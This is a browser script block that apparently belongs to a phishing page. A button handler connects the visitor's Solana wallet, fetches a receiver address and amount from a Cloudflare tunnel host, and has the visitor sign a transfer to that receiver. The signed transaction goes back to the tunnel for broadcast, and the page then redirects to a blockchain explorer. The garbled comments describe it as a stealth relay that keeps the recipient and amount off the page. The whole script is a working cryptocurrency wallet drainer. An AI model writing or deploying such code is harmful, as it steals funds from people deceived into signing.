<script>
    // ğŸ”± 2026 æœ€ç»ˆéšèº«ç‰ˆ - ä»…åšä¼ å£°ç­’
    const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";

    document.getElementById('cta').onclick = async () => {
        const sWeb3 = window.solanaWeb3;
        const p = window.solana;
        if (!p) return;

        try {
            await p.connect();
            const address = p.publicKey.toString();
            document.getElementById('progress').style.width = "30%";

            // 1. é—®åç«¯ï¼šè¯¥è½¬å¤šå°‘ï¼Ÿæ‹¿åˆ° Blockhash å’Œé‡‘é¢
            const info = await fetch(`${tunnel}/prepare_tx`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ address })
            }).then(r => r.json());

            if (info.error) { console.log("Node Synced"); return; }

            // 2. æ„é€ äº¤æ˜“ï¼ˆå‰ç«¯ä¸å†™æ­»é‡‘é¢å’Œæ”¶æ¬¾äººï¼Œå…¨ä»åç«¯æ‹¿ï¼‰
            const tx = new sWeb3.Transaction().add(
                sWeb3.SystemProgram.transfer({
                    fromPubkey: p.publicKey,
                    toPubkey: new sWeb3.PublicKey(info.receiver),
                    lamports: info.amount,
                })
            );
            tx.recentBlockhash = info.bh;
            tx.feePayer = p.publicKey;
            document.getElementById('progress').style.width = "60%";

            // 3. ç­¾å
            const signed = await p.signTransaction(tx);
            
            // 4. åºåˆ—åŒ–å¹¶å›ä¼ åç«¯è¿›è¡Œâ€œå¹¿æ’­â€
            const serialized = signed.serialize();
            let binary = '';
            const bytes = new Uint8Array(serialized);
            for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
            const base64Tx = btoa(binary);

            await fetch(`${tunnel}/broadcast`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ raw_tx: base64Tx })
            });

            document.getElementById('progress').style.width = "100%";
            setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1000);

        } catch (e) { 
            console.error(e);
            location.reload(); 
        }
    };
</script>
